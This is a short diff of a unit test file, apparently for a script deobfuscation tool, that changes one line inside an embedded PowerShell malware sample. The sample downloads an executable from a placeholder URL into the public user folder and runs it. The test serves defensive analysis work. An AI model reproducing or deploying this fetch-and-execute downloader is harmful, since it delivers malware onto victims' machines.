@@ -620,7 +620,7 @@ class TestPs1RealWorldLarge(TestUnitBase):
             $YYU = New-Object System.Net.WebClient
             $NSB = $nsadasd.Next(10000, 282133)
             $SDC = 'C:\Users\Public\' + $NSB + '.exe'
-            foreach ($asfc in '[[URL]]') {
+            foreach ($asfc in ,'[[URL]]') {
               try {
                 $YYU.DownloadFile($asfc.ToString(), $SDC)
                 Invoke-Item ($SDC)
